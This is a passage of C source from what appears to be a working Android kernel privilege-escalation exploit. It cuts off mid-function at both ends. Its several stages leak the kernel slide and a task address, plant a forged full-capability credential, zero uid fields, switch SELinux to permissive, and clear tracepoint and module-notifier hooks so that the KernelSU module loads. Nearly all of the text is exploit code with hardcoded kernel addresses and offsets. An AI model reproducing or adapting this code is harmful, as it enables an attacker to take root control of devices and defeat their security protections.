				s = g_slide;
				logf("[fake9] pre%d ok=%d slide=%#llx\n", t,
				     pre.ok, s);
				if (s && !(s & 0x1fffffULL) &&
				    s >= 0x1000000000ULL &&
				    s <= 0x3000000000ULL) {
					if (prev == s) {
						slide0 = s;
						stable = 1;
					} else
						prev = s;
				} else
					prev = 0;
			}
		}
		if (!stable) {
			logf("[fake9] no stable slide\n");
			return 0;
		}
		logf("[fake9] slide OK %#llx\n", (unsigned long long)slide0);
		pin(g_cpu);
		trace_start();
		{
			pid_t a = fork();

			if (a == 0)
				_exit(0);
			if (a > 0)
				waitpid(a, NULL, 0);
		}
		g_h_stack = mmap(NULL, HELPER_STACK, PROT_READ | PROT_WRITE,
				 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
		if (g_h_stack == MAP_FAILED) {
			logf("[fake9] stack failed\n");
			return 0;
		}
		H = clone(fake5_helper, (char *)g_h_stack + HELPER_STACK,
			  CLONE_VM | SIGCHLD, NULL);
		if (H < 0) {
			logf("[fake9] clone failed errno=%d\n", errno);
			return 0;
		}
		usleep(50000);
		trace_stop();
		{
			int cnt = harvest(g_evs, 400000);
			unsigned long long cand[12];
			int nc = 0;

			for (int i = cnt - 1; i >= 0 && nc < 12; i--) {
				unsigned long long p = 0;

				if (g_evs[i].type == EV_CACHE_ALLOC &&
				    g_evs[i].alloc == 0x12c0 &&
				    (g_evs[i].ptr >> 48) == 0xffff)
					p = g_evs[i].ptr;
				else if (g_evs[i].type == EV_CACHE_FREE &&
					 (g_evs[i].site & 0x1fffffULL) ==
						 0xaaff0 &&
					 (g_evs[i].ptr >> 48) == 0xffff)
					p = g_evs[i].ptr;
				if (!p)
					continue;
				{
					int dup = 0;

					for (int k = 0; k < nc; k++)
						if (cand[k] == p)
							dup = 1;
					if (!dup)
						cand[nc++] = p;
				}
			}
			logf("[fake9] harvest cnt=%d cands=%d\n", cnt, nc);
			for (int c = 0; c < nc && !TH; c++) {
				struct plant_res cp;
				char hp[64], hb[64] = {0};
				int fd, n;

				memset(&cp, 0, sizeof(cp));
				run_plant(cand[c] + OFF_TASK_COMM, 1, &cp, 0,
					  MODE_ZERO);
				snprintf(hp, sizeof(hp), "/proc/%d/comm",
					 (int)H);
				fd = open(hp, O_RDONLY);
				if (fd >= 0) {
					n = (int)read(fd, hb, 63);
					if (n > 0)
						hb[n] = 0;
					close(fd);
				}
				logf("[fake9] cand%d=%#llx ok=%d comm='%s'\n", c,
				     cand[c], cp.ok, hb);
				if (cp.ok && !hb[0])
					TH = cand[c];
			}
		}
		logf("[fake9] TASK=%#llx helper=%d\n", (unsigned long long)TH,
		     (int)H);
		if (!TH) {
			logf("[fake9] task leak failed\n");
			return 0;
		}
		for (int t = 0; t < 8 && !landed; t++) {
			int seq, w;

			memset(&fp, 0, sizeof(fp));
			run_plant(TH + OFF_TASK_CRED, 1, &fp, 0, MODE_FAKE);
			if (!fp.ok) {
				if (!fp.retry)
					park_forever("fake9 cred unsafe");
				continue;
			}
			if (g_slide != slide0) {
				logf("[fake9] drift %#llx\n",
				     (unsigned long long)g_slide);
				continue;
			}
			seq = atomic_fetch_add(&g_h_seq, 1) + 1;
			for (w = 0; w < 300 && g_h_seen != seq; w++)
				usleep(1000);
			logf("[fake9] try%d uid=%d euid=%d caps=%#llx seen=%d\n",
			     t, g_h_uid, g_h_euid,
			     (unsigned long long)g_h_caps, g_h_seen);
			if (g_h_caps == FULLCAP) {
				landed = 1;
				A = fp.A;
			}
		}
		if (!landed) {
			logf("[fake9] fake cred failed\n");
			return 0;
		}
		logf("[fake9] FAKE CRED A=%#llx\n", A);
		memset(&rp, 0, sizeof(rp));
		run_plant(A + CRED_UID_OFF, 1, &rp, 0, MODE_ZERO);
		logf("[fake9] repair uid ok=%d\n", rp.ok);
		memset(&rp, 0, sizeof(rp));
		run_plant(A + CRED_UID_OFF + 8, 1, &rp, 0, MODE_ZERO);
		logf("[fake9] repair suid ok=%d\n", rp.ok);
		atomic_store(&g_h_load, 1);
		atomic_fetch_add(&g_h_seq, 1);
		for (int w = 0; w < 5000 && g_h_rc == -999; w++)
			usleep(1000);
		logf("[fake9] finit rc=%ld errno=%d uid=%d euid=%d caps=%#llx\n",
		     g_h_rc, g_h_errno, g_h_uid, g_h_euid,
		     (unsigned long long)g_h_caps);
		{
			FILE *mf = fopen("/proc/modules", "r");
			char ml[256];
			int live = 0;

			while (mf && fgets(ml, sizeof(ml), mf))
				if (!strncmp(ml, "kernelsu ", 9)) {
					live = 1;
					logf("[fake9] %s", ml);
				}
			if (mf)
				fclose(mf);
			logf("[fake9] kernelsu live=%d\n", live);
		}
		logf("[fake9] done\n");
		for (;;)
			pause();
	}

	if (g_fake10_stage) {
		static const unsigned long long tps[] = {
			0xffffffc08230d980ULL, /* check_file_open */
			0xffffffc08230d6b0ULL, /* commit_creds */
			0xffffffc08230d700ULL, /* exit_creds */
			0xffffffc08230d660ULL, /* avc_lookup */
			0xffffffc08230d570ULL, /* avc_insert */
			0xffffffc08230d5c0ULL, /* avc_node_delete */
			0xffffffc08230d610ULL, /* avc_node_replace */
			0xffffffc08230a5f0ULL, /* ogki_audit_log_module_sign */
		};
		struct child_report rep;
		struct plant_res pre, cp, bp, dp, rp;
		unsigned long long slide0 = 0;
		int stable = 0, cap_ok = 0, dis = 0;

		logf("[fake10] child=%d cred=%#llx\n", C,
		     (unsigned long long)R);
		{
			unsigned long long prev = 0;

			for (int t = 0; t < 10 && !stable; t++) {
				unsigned long long s;

				memset(&pre, 0, sizeof(pre));
				run_plant(R + CRED_UID_OFF, 1, &pre, 0, MODE_ZERO);
				s = g_slide;
				logf("[fake10] pre%d ok=%d slide=%#llx\n", t, pre.ok, s);
				if (s && !(s & 0x1fffffULL) &&
				    s >= 0x1000000000ULL && s <= 0x3000000000ULL) {
					if (prev == s) { slide0 = s; stable = 1; }
					else prev = s;
				} else prev = 0;
			}
		}
		if (!stable) { logf("[fake10] no slide\n"); return 0; }
		logf("[fake10] slide OK %#llx\n", (unsigned long long)slide0);
		for (unsigned i = 0; i < sizeof(tps) / sizeof(tps[0]); i++) {
			memset(&dp, 0, sizeof(dp));
			run_plant(tps[i] + slide0 + 0x48, 1, &dp, 0, MODE_ZERO);
			logf("[fake10] disarm%u tp=%#llx +48 ok=%d\n", i,
			     tps[i], dp.ok);
			if (dp.ok) dis++;
			if (g_slide != slide0) { logf("[fake10] drift\n"); break; }
		}
		logf("[fake10] disarmed=%d\n", dis);
		for (int t = 0; t < 12 && !cap_ok; t++) {
			struct pollfd pf;
			ssize_t rn;

			memset(&cp, 0, sizeof(cp));
			run_plant(R + 0x40, 1, &cp, 0, MODE_PTR);
			if (!cp.ok) { if (!cp.retry) park_forever("fake10 cap unsafe"); continue; }
			if (g_slide != slide0) continue;
			if (!((cp.A >> 16) & 1)) { logf("[fake10] cap b16=0\n"); continue; }
			memset(&rep, 0, sizeof(rep));
			if (write(go_fd, "A", 1) != 1) break;
			pf.fd = st_fd; pf.events = POLLIN;
			rn = poll(&pf, 1, 4000) > 0 ? read(st_fd, &rep, sizeof(rep)) : -1;
			if (rn != (ssize_t)sizeof(rep) || rep.magic != CHILD_MAGIC) {
				logf("[fake10] cap no report rn=%zd\n", rn); break;
			}
			logf("[fake10] cap got=%#llx uid=%d\n",
			     (unsigned long long)rep.caps, rep.uid);
			if (rep.caps == cp.A) cap_ok = 1;
		}
		if (!cap_ok) { logf("[fake10] cap failed\n"); return 0; }
		logf("[fake10] CAP OK\n");
		for (int t = 0; t < 8; t++) {
			memset(&bp, 0, sizeof(bp));
			run_plant(R + 0x48, 1, &bp, 0, MODE_PTR);
			if (!bp.ok) { if (!bp.retry) park_forever("fake10 bset unsafe"); continue; }
			if (g_slide == slide0 && ((bp.A >> 16) & 1)) {
				logf("[fake10] bset ok\n"); break;
			}
		}
		memset(&rp, 0, sizeof(rp));
		run_plant(SELINUX_STATE_STATIC + slide0 - 7, 1, &rp, 0, MODE_ZERO);
		logf("[fake10] selinux write ok=%d\n", rp.ok);
		{
			FILE *ef = fopen("/sys/fs/selinux/enforce", "r");
			char eb[8] = {0};

			if (ef) { if (!fgets(eb, sizeof(eb), ef)) eb[0] = 0; fclose(ef); }
			logf("[fake10] enforce='%s'\n", eb);
		{
			struct plant_res np;

			memset(&np, 0, sizeof(np));
			run_plant(0xffffffc0821ec4e8ULL + slide0, 1, &np, 0, MODE_ZERO);
			logf("[fake10] notifier+40 ok=%d\n", np.ok);
			memset(&np, 0, sizeof(np));
			run_plant(0xffffffc0821ec4e0ULL + slide0, 1, &np, 0, MODE_ZERO);
			logf("[fake10] notifier+38 ok=%d\n", np.ok);
		}
		}
		logf("[fake10] G: finit\n");
		(void)!write(go_fd, "G", 1);
		for (int rr = 0; rr < 3; rr++) {
			struct pollfd pf = { .fd = st_fd, .events = POLLIN };

			memset(&rep, 0, sizeof(rep));
			if (poll(&pf, 1, 5000) > 0 &&
			    read(st_fd, &rep, sizeof(rep)) == (ssize_t)sizeof(rep) &&
			    rep.magic == CHILD_MAGIC)
				logf("[fake10] finit rc=%d errno=%d uid=%d caps=%#llx\n",
				     rep.setuid_ret, rep.setuid_errno, rep.uid,
				     (unsigned long long)rep.caps);
			else break;
		}
		{
			FILE *mf = fopen("/proc/modules", "r");
			char ml[256];
			int live = 0;

			while (mf && fgets(ml, sizeof(ml), mf))
				if (!strncmp(ml, "kernelsu ", 9)) { live = 1; logf("[fake10] %s", ml); }
			if (mf) fclose(mf);
			logf("[fake10] kernelsu live=%d\n", live);
		}
		logf("[fake10] done\n");
		for (;;) pause();
	}

	if (g_fake2_stage) {
		struct child_report rep;
		struct plant_res sp, fp;
		unsigned long long slide0 = 0, A = 0;
		int se_ok = 0, landed = 0;

		logf("[fake3] child=%d task=%#llx cred=%#llx\n", C,
		     (unsigned long long)g_child_task, (unsigned long long)R);
		/* 1. prime g_slide and require two consecutive plausible slides.
		 * The first plant cannot depend on a slide it has not computed
		 * yet, and we must not touch SELinux to validate it. */
		{
			unsigned long long prev = 0;
			int stable = 0;

			for (int t = 0; t < 10 && !stable; t++) {
				struct plant_res pre;
				unsigned long long s;

				memset(&pre, 0, sizeof(pre));
				run_plant(R + CRED_UID_OFF, 1, &pre, 0,
					  MODE_ZERO);
				s = g_slide;
				logf("[fake3] preslide%d ok=%d slide=%#llx\n",
				     t, pre.ok, s);
				if (!s || (s & 0x1fffffULL) ||
				    s < 0x1000000000ULL ||
				    s > 0x3000000000ULL) {
					prev = 0;
					continue;
				}
				if (prev == s) {
					slide0 = s;
					stable = 1;
				} else {
					prev = s;
				}
			}
			if (!stable) {
				logf("[fake3] no stable slide\n");
				return 0;
			}
			logf("[fake3] slide OK %#llx\n",
			     (unsigned long long)slide0);
		}
		/* 3. install the fake cred; verify through the child's capget.
		 * A silent miss leaves task->cred untouched, so retry is safe. */
		for (int t = 0; t < 12 && !landed; t++) {
			struct pollfd pf;
			ssize_t rn;

			memset(&fp, 0, sizeof(fp));
			run_plant(g_child_task + OFF_TASK_CRED, 1, &fp, 0,
				  MODE_FAKE);
			if (!fp.ok) {
				if (!fp.retry)
					park_forever("fake3 cred unsafe");
				continue;
			}
			if (g_slide != slide0) {
				logf("[fake3] slide drift %#llx != %#llx; retry\n",
				     (unsigned long long)g_slide, slide0);
				continue;
			}
			memset(&rep, 0, sizeof(rep));
			if (write(go_fd, "A", 1) != 1)
				break;
			pf.fd = st_fd;
			pf.events = POLLIN;
			rn = poll(&pf, 1, 4000) > 0
				     ? read(st_fd, &rep, sizeof(rep)) : -1;
			if (rn != (ssize_t)sizeof(rep) ||
			    rep.magic != CHILD_MAGIC) {
				logf("[fake3] no report rn=%zd\n", rn);
				break;
			}
			logf("[fake3] try%d caps=%#llx uid=%d\n", t,
			     (unsigned long long)rep.caps, rep.uid);
			if (rep.caps == FULLCAP) {
				landed = 1;
				A = fp.A;
			}
		}
		if (!landed) {
			logf("[fake3] FAILED: fake cred not landed\n");
			return 0;
		}
		logf("[fake3] FAKE CRED LANDED A=%#llx slide=%#llx\n", A,
		     (unsigned long long)slide0);
		/* 4. repair uid/suid, then confirm uid==0 */
		for (int t = 0; t < 8; t++) {
			struct plant_res rp;
			struct pollfd pf;
			ssize_t rn;

			memset(&rp, 0, sizeof(rp));
			run_plant(A + CRED_UID_OFF, 1, &rp, 0, MODE_ZERO);
			if (!rp.ok && !rp.retry)
				park_forever("fake3 repair unsafe");
			memset(&rep, 0, sizeof(rep));
			if (write(go_fd, "A", 1) != 1)
				break;
			pf.fd = st_fd;
			pf.events = POLLIN;
			rn = poll(&pf, 1, 4000) > 0
				     ? read(st_fd, &rep, sizeof(rep)) : -1;
			if (rn != (ssize_t)sizeof(rep) ||
			    rep.magic != CHILD_MAGIC)
				break;
			logf("[fake3] repair%d uid=%d euid=%d caps=%#llx\n", t,
			     rep.uid, rep.euid,
			     (unsigned long long)rep.caps);
			if (rep.uid == 0 && rep.caps == FULLCAP)
				break;
		}
		{
			struct plant_res rp;

			memset(&rp, 0, sizeof(rp));
			run_plant(A + CRED_UID_OFF + 8, 1, &rp, 0, MODE_ZERO);
			logf("[fake3] suid repair ok=%d\n", rp.ok);
		}
		write_ksu_script();
		logf("[fake3] waking child: fake cred -> ksud late-load\n");
		(void)!write(go_fd, "G", 1);
		sleep(45);
		{
			FILE *mf = fopen("/proc/modules", "r");
			char ml[256];
			int live = 0;

			while (mf && fgets(ml, sizeof(ml), mf))
				if (!strncmp(ml, "kernelsu ", 9)) {
					live = 1;
					logf("[fake3] %s", ml);
				}
			if (mf)
				fclose(mf);
			logf("[fake3] kernelsu live=%d\n", live);
		}
		logf("[fake3] done\n");
		for (;;)
			pause();
	}
	if (g_uid0_stage) {
		struct child_report rep;
		struct plant_res pr;
		int got = 0;

		logf("[uid0] cred=%#llx slot=%#llx task=%#llx\n",
		     (unsigned long long)R,
		     (unsigned long long)(R + CRED_UID_OFF),
		     (unsigned long long)g_child_task);
		for (int round = 0; round < 12 && !got; round++) {
			int planted = 0;

			for (int t = 0; t < 4 && !planted; t++) {
				memset(&pr, 0, sizeof(pr));
				run_plant(R + CRED_UID_OFF, 1, &pr, 0,
					  MODE_ZERO);
				if (pr.ok)
					planted = 1;
				else if (!pr.retry)
					park_forever("uid0 plant unsafe");
			}
			if (!planted)
				continue;
			memset(&rep, 0, sizeof(rep));
			if (write(go_fd, "A", 1) != 1)
				break;
			{
				struct pollfd pf = { .fd = st_fd,
						     .events = POLLIN };
				ssize_t rn = poll(&pf, 1, 4000) > 0
						     ? read(st_fd, &rep,
							    sizeof(rep))
						     : -1;

				if (rn != (ssize_t)sizeof(rep) ||
				    rep.magic != CHILD_MAGIC) {
					logf("[uid0] round %d no report rn=%zd\n",
					     round + 1, rn);
					break;
				}
			}
			logf("[uid0] round %d report uid=%d euid=%d caps=%#llx\n",
			     round + 1, rep.uid, rep.euid,
			     (unsigned long long)rep.caps);
			if (rep.uid == 0)
				got = 1;
		}
		if (!got) {
			logf("[uid0] FAILED: uid write not landed\n");
			return 0;
		}
		logf("[uid0] UID ZERO LANDED\n");
		{
			int cap_ok = 0;

			for (int t = 0; t < 16 && !cap_ok; t++) {
				struct plant_res cp;
				struct pollfd pf;
				ssize_t rn;

				memset(&cp, 0, sizeof(cp));
				run_plant(R + 0x40, 1, &cp, 0, MODE_PTR);
				if (!cp.ok) {
					if (!cp.retry)
						park_forever("cap plant unsafe");
					continue;
				}
				if (!((cp.A >> 16) & 1)) {
					logf("[uid0] cap A=%#llx bit16=0 retry\n",
					     (unsigned long long)cp.A);
					continue;
				}
				memset(&rep, 0, sizeof(rep));
				if (write(go_fd, "A", 1) != 1)
					break;
				pf.fd = st_fd;
				pf.events = POLLIN;
				rn = poll(&pf, 1, 4000) > 0
					     ? read(st_fd, &rep, sizeof(rep))
					     : -1;
				if (rn != (ssize_t)sizeof(rep) ||
				    rep.magic != CHILD_MAGIC) {
					logf("[uid0] cap report missing rn=%zd\n",
					     rn);
					break;
				}
				logf("[uid0] cap want=%#llx got=%#llx\n",
				     (unsigned long long)cp.A,
				     (unsigned long long)rep.caps);
				if (rep.caps == cp.A)
					cap_ok = 1;
			}
			logf("[uid0] CAP_SYS_MODULE %s\n",
			     cap_ok ? "OK" : "MISSING");
		}
		{
			int se_ok = 0;

			for (int t = 0; t < 10 && !se_ok; t++) {
				struct plant_res sp;
				FILE *ef;
				char eb[8] = {0};

				memset(&sp, 0, sizeof(sp));
				run_plant(SELINUX_STATE_STATIC + g_slide - 7, 1,
					  &sp, 0, MODE_ZERO);
				if (!sp.ok) {
					if (!sp.retry)
						park_forever("selinux plant unsafe");
					continue;
				}
				usleep(100000);
				ef = fopen("/sys/fs/selinux/enforce", "r");
				if (ef) {
					if (!fgets(eb, sizeof(eb), ef))
						eb[0] = 0;
					fclose(ef);
				}
				logf("[uid0] selinux enforce now='%s'\n", eb);
				if (eb[0] == '0')
					se_ok = 1;
			}
			logf("[uid0] SELINUX_PERMISSIVE %s\n",
			     se_ok ? "OK" : "FAILED");
		}
		{
			for (int t = 0; t < 4; t++) {
				struct plant_res np;

				memset(&np, 0, sizeof(np));
				run_plant(MODULE_NOTIFY_LIST_STATIC +
						  MODULE_NOTIFY_HEAD_OFF +
						  g_slide,
					  1, &np, 0, MODE_ZERO);
				if (!np.ok) {
					if (!np.retry)
						park_forever("notify plant unsafe");
					continue;
				}
				logf("[uid0] notify head zero round %d A=%#llx\n",
				     t, (unsigned long long)np.A);
			}
		}
		logf("[uid0] sending G (finit_module)\n");
		(void)!write(go_fd, "G", 1);
		for (int rr = 0; rr < 6; rr++) {
			struct pollfd pf = { .fd = st_fd, .events = POLLIN };

			memset(&rep, 0, sizeof(rep));
			if (poll(&pf, 1, 3000) > 0 &&
			    read(st_fd, &rep, sizeof(rep)) ==
				    (ssize_t)sizeof(rep) &&
			    rep.magic == CHILD_MAGIC) {
				if (rep.ruid == 99)
					logf("[uid0] PROBE finit(-1) rc=%d errno=%d (9=EBADF means capable, 1=EPERM means denied)\n",
					     rep.setuid_ret, rep.setuid_errno);
				else if (rep.ruid == 98)
					logf("[uid0] INIT_MODULE rc=%d errno=%d size=%d\n",
					     rep.setuid_ret, rep.setuid_errno,
					     rep.rsuid);
				else
					logf("[uid0] finit%d flag=%d rc=%d errno=%d uid=%d caps=%#llx\n",
					     rr, rep.ruid, rep.setuid_ret,
					     rep.setuid_errno, rep.uid,
					     (unsigned long long)rep.caps);
			} else
				break;
		}
		sleep(5);
		{
			char sp[64], sb[256] = {0};
			int sfd, sl;

			snprintf(sp, sizeof(sp), "/proc/%d/stat", C);
			sfd = open(sp, O_RDONLY);
			if (sfd >= 0) {
				sl = (int)read(sfd, sb, sizeof(sb) - 1);
				if (sl > 0)
					sb[sl] = 0;
				close(sfd);
				logf("[uid0] worker stat: %s\n", sb);
			} else {
				logf("[uid0] worker gone errno=%d\n", errno);
			}
		}
		{
			FILE *mf = fopen("/proc/modules", "r");
			char ml[256];
			int live = 0;

			while (mf && fgets(ml, sizeof(ml), mf))
				if (!strncmp(ml, "kernelsu ", 9)) {
					live = 1;
					logf("[uid0] %s", ml);
				}
			if (mf)
				fclose(mf);
			logf("[uid0] kernelsu live=%d\n", live);
		}
		logf("[uid0] done\n");
		for (;;)
			pause();
	}

	if (g_chain_stage) {
		struct child_report rep;
		struct plant_res fc, rr;
		unsigned long long A = 0;
		int got = 0;

		preflight();
		write_ksu_script();
		{
			struct plant_res sc;
			struct pollfd spf;
			struct child_report srep;
			ssize_t srn;

			memset(&sc, 0, sizeof(sc));
			run_plant(g_child_task + OFF_TASK_COMM, 1, &sc, 0,
				  MODE_ZERO);
			memset(&srep, 0, sizeof(srep));
			(void)!write(go_fd, "A", 1);
			spf.fd = st_fd;
			spf.events = POLLIN;
			srn = poll(&spf, 1, 4000) > 0
				      ? read(st_fd, &srep, sizeof(srep))
				      : -1;
			logf("[chain] sanity ok=%d rn=%zd uid=%d caps=%#llx\n",
			     sc.ok, srn, srep.uid,
			     (unsigned long long)srep.caps);
			if (srn != (ssize_t)sizeof(srep)) {
				int cst = 0;
				pid_t wr = waitpid(C, &cst, WNOHANG);

				logf("[chain] sanity child waitpid=%d st=%#x\n",
				     (int)wr, cst);
			}
		}
		for (int outer = 0; outer < 8 && !got; outer++) {
			int planted = 0;

			if (outer) {
				close(go_fd);
				close(st_fd);
				waitpid(C, NULL, 0);
				R = leak_cred(&C, &go_fd, &st_fd, 5);
				if (!R) {
					logf("[chain] releak failed\n");
					continue;
				}
			}
			logf("[chain] ===== round %d child=%d task=%#llx =====\n",
			     outer + 1, C, (unsigned long long)g_child_task);
			for (int t = 0; t < 6 && !planted; t++) {
				memset(&fc, 0, sizeof(fc));
				run_plant(g_child_task + OFF_TASK_CRED, 1, &fc, 0,
					  MODE_FAKE);
				if (fc.ok)
					planted = 1;
				else if (!fc.retry)
					park_forever("chain fake plant unsafe");
			}
			if (!planted) {
				logf("[chain] no plant this round\n");
				(void)!write(go_fd, "X", 1);
				continue;
			}
			for (int rep_i = 0; rep_i < 4 && !got; rep_i++) {
				struct pollfd pf;
				ssize_t rn;

				memset(&rep, 0, sizeof(rep));
				if (write(go_fd, "A", 1) != 1)
					break;
				pf.fd = st_fd;
				pf.events = POLLIN;
				rn = poll(&pf, 1, 4000) > 0
					     ? read(st_fd, &rep, sizeof(rep))
					     : -1;
				if (rn != (ssize_t)sizeof(rep) ||
				    rep.magic != CHILD_MAGIC) {
					int cst = 0;
					pid_t wr = waitpid(C, &cst,
							   WNOHANG);

					logf("[chain] no report rn=%zd child waitpid=%d st=%#x\n",
					     rn, (int)wr, cst);
					break;
				}
				logf("[chain] report uid=%d euid=%d caps=%#llx\n",
				     rep.uid, rep.euid,
				     (unsigned long long)rep.caps);
				if (rep.caps != FULLCAP)
					break;
				if (rep.uid == 0 && rep.euid == 0) {
					got = 1;
					A = fc.A;
					break;
				}
				logf("[chain] repair uid at %#llx\n",
				     (unsigned long long)(fc.A + CRED_UID_OFF));
				memset(&rr, 0, sizeof(rr));
				run_plant(fc.A + CRED_UID_OFF, 1, &rr, 0,
					  MODE_ZERO);
				if (!rr.ok && !rr.retry)
					park_forever("chain repair unsafe");
			}
			if (!got) {
				int cst = 0;
				pid_t wr = waitpid(C, &cst, WNOHANG);

				logf("[chain] round %d miss child waitpid=%d st=%#x\n",
				     outer + 1, (int)wr, cst);
				(void)!write(go_fd, "X", 1);
			}
		}
		if (!got) {
			logf("[chain] FAILED: no fake cred landed\n");
			return 0;
		}
		logf("[chain] FAKE CRED LANDED A=%#llx\n", A);
		memset(&rr, 0, sizeof(rr));
		run_plant(A + CRED_UID_OFF + 8, 1, &rr, 0, MODE_ZERO);
		if (!rr.ok && !rr.retry)
			logf("[chain] suid repair unsafe\n");
		if (write(go_fd, "G", 1) != 1)
			logf("[chain] G write failed\n");
		{
			struct pollfd pf = { .fd = st_fd, .events = POLLIN };

			memset(&rep, 0, sizeof(rep));
			if (poll(&pf, 1, 15000) > 0 &&
			    read(st_fd, &rep, sizeof(rep)) ==
				    (ssize_t)sizeof(rep) &&
			    rep.magic == CHILD_MAGIC)
				logf("[chain] final uid=%d euid=%d caps=%#llx\n",
				     rep.uid, rep.euid,
				     (unsigned long long)rep.caps);
			else
				logf("[chain] final report missing\n");
		}
		close(go_fd);
		close(st_fd);
		{
			int st = 0;

			if (waitpid(C, &st, 0) == C)
				logf("[chain] child exit=%#x\n", st);
		}
		{
			FILE *mf = fopen("/proc/modules", "r");
			char ml[256];
			int live = 0;

			while (mf && fgets(ml, sizeof(ml), mf))
				if (!strncmp(ml, "kernelsu ", 9)) {
					live = 1;
					logf("[chain] %s", ml);
				}
			if (mf)
				fclose(mf);
			logf("[chain] kernelsu live=%d\n", live);
		}
		logf("[chain] done\n");
		for (;;)
			pause();
	}

	if (fake_stage) {
		struct plant_res fc;

		/* YuKongA's chain, in order:
		 *   1. point task->cred at a fake full-cap cred planted over the
		 *      reclaimed timer slab page,
		 *   2. zero selinux_state.enforcing so ksud may load a module,
		 *   3. zero panic_on_warn (the self-parent erase WARNs),
		 *   4. repair the fake cred's uid/gid that step 1 dirtied.
		 */
		if (!preflight()) {
			logf("[!] preflight failed; refusing to plant\n");
			return 0;
		}
		write_ksu_script();
		/* own63: verified-slide loop (own58). A wrong slide is the top
		 * cause of fake-stage panics; the selinux 1->0 flip is the only
		 * reliable proof, so keep planting until enforce reads 0. */
		{
			struct plant_res pv2;
			int vs = 0;

			for (int t = 0; t < 8 && !vs; t++) {
				unsigned long long s;
				char eb[8] = {0};
				FILE *ef;

				memset(&pv2, 0, sizeof(pv2));
				run_plant(R + CRED_UID_OFF, 1, &pv2, 0, MODE_ZERO);
				s = pv2.ok ? g_slide : 0;
				logf("[fake] pre%d ok=%d slide=%#llx\n", t, pv2.ok, s);
				if (!s || (s & 0x1fffffULL) ||
				    s < 0x1000000000ULL || s > 0x3000000000ULL)
					continue;
				memset(&pv2, 0, sizeof(pv2));
				run_plant(SELINUX_STATE_STATIC + s - 7, 1, &pv2, 0,
					  MODE_ZERO);
				usleep(100000);
				ef = fopen("/sys/fs/selinux/enforce", "r");
				if (ef) {
					if (!fgets(eb, sizeof(eb), ef))
						eb[0] = 0;
					fclose(ef);
				}
				logf("[fake] verify slide=%#llx enforce=%c\n", s,
				     eb[0] ? eb[0] : '-');
				if (eb[0] == '0') {
					g_slide = s;
					g_slide_lock = s;
					vs = 1;
				}
			}
			if (!vs)
				park_forever("no verified slide");
			logf("[fake] slide VERIFIED %#llx\n",
			     (unsigned long long)g_slide);
			{
				FILE *sf = fopen("/data/local/tmp/ksu_slide.txt", "w");

				if (sf) {
					fprintf(sf, "%llx\n",
						(unsigned long long)g_slide);
					fclose(sf);
				}
			}
		}
		if (!g_child_task)
			park_forever("child task not leaked");
		{
			int se_ok = 0;

			for (int a = 0; a < 6 && !se_ok; a++)
				se_ok = !stage_write(TRACEPOINT_SYS_EXIT_STATIC +
							     g_slide + 0x48,
						     MODE_ZERO, "sys_exit_funcs",
						     NULL);
			if (!se_ok)
				logf("[!] sys_exit funcs failed after retries\n");
		}
		if (0 && read_panic_on_warn() != 0 &&
		    stage_write(PANIC_ON_WARN_STATIC + g_slide, MODE_ZERO,
				"panic_on_warn", NULL))
			park_forever("panic_on_warn write failed");
		memset(&fc, 0, sizeof(fc));
		if (stage_write(g_child_task + OFF_TASK_CRED, MODE_FAKE,
				"fake_cred", &fc))
			park_forever("fake cred write failed");
		/* own64: the fake cred lives in a spray socket page; stop the
		 * spray threads so later sends cannot clobber the caps/ids. */
		atomic_store(&g_stop_spray, 1);
		if (!g_slide || g_base != 0xffffff7f80000000ULL) {
			logf("[!] invalid base/slide base=%#llx slide=%#llx; refusing to plant\n",
			     (unsigned long long)g_base, (unsigned long long)g_slide);
			return 0;
		}
		g_fake_A = fc.A;
		logf("[+] fake cred A=%#llx selinux_state=%#llx\n",
		     (unsigned long long)fc.A,
		     (unsigned long long)(SELINUX_STATE_STATIC + g_slide));		/* YuKongA, verbatim: rb_erase dirtied the fake cred's uid/gid
		 * with the erase target, so repair it with zero writes. The
		 * dirty real/saved uid otherwise makes the worker's exec
		 * (bprm_fill_uid / cap_bprm_creds_from_file) crash the kernel.
		 * Repair both cred pages (real_cred fc2 and cred fc). */
		/* own72: wake the child FIRST so its kmsg capture is running
		 * before the uid-repair plant (the risky step). */
		logf("[fake] POST-INSTALL: waking child for kmsg capture\n");
		if (write(go_fd, "A", 1) != 1)
			logf("[!] early wake write failed\n");
		if (g_skip_fake_uid) {
			logf("[fake] SKIP 2s post-install heartbeat (nofix) uptime=%.2f\n",
			     read_uptime());
		} else {
			for (int hb = 0; hb < 2; hb++) {
				sleep(1);
				logf("[fake] POST-INSTALL heartbeat %d\n", hb);
			}
		}
		{
			int ok = 0;

			if (g_skip_fake_uid) {
				logf("[fake] SKIP fake_uid repair plant (nofix) uptime=%.2f\n",
				     read_uptime());
			} else {
				for (int a = 0; a < 4 && !ok; a++)
					ok = !stage_write(fc.A + CRED_UID_OFF,
							  MODE_ZERO, "fake_uid", NULL);
				if (!ok)
					logf("[!] fake uid fix failed after retries\n");
			}
		}
		if (g_fake_fix) {
		{
			int ok = 0;

			for (int a = 0; a < 4 && !ok; a++)
				ok = !stage_write(fc.A + CRED_UID_OFF + 8, MODE_ZERO,
						  "fake_suid", NULL);
			if (!ok)
				logf("[!] fake suid fix failed after retries\n");
		}
		{
			int ok = 0;

			for (int a = 0; a < 4 && !ok; a++)
				ok = !stage_write(fc.A + CRED_UID_OFF + 16, MODE_ZERO,
						  "fake_euid", NULL);
			if (!ok)
				logf("[!] fake euid fix failed after retries\n");
		}
		{
			int ok = 0;

			for (int a = 0; a < 4 && !ok; a++)
				ok = !stage_write(fc.A + CRED_UID_OFF + 24, MODE_ZERO,
						  "fake_fsuid", NULL);
			if (!ok)
				logf("[!] fake fsuid fix failed after retries\n");
		}
		}
	} else {
		memset(&r, 0, sizeof(r));
		for (int a = 0; a < 3 && !r.ok; a++) {
			logf("[+] plant attempt %d/3\n", a + 1);
			run_plant(R + CRED_UID_OFF, a + 1, &r, selftest,
				  pointer_mode);
		}
		if (!r.ok)
			park_forever("no successful plant");
	}
	if (fake_stage) {
		char path[64], line[256];
		FILE *pf;
		int ruid = -1;

		snprintf(path, sizeof(path), "/proc/%d/status", C);
		pf = fopen(path, "r");
		logf("[verify] %s -> %s\n", path, pf ? "open" : "FAILED");
		if (pf) {
			while (fgets(line, sizeof(line), pf)) {
				if (!strncmp(line, "Uid:", 4) ||
				    !strncmp(line, "Gid:", 4) ||
				    !strncmp(line, "CapEff:", 7) ||
				    !strncmp(line, "Name:", 5)) {
					logf("[verify] %s", line);
					if (!strncmp(line, "Uid:", 4))
						ruid = atoi(line + 4);
				}
			}
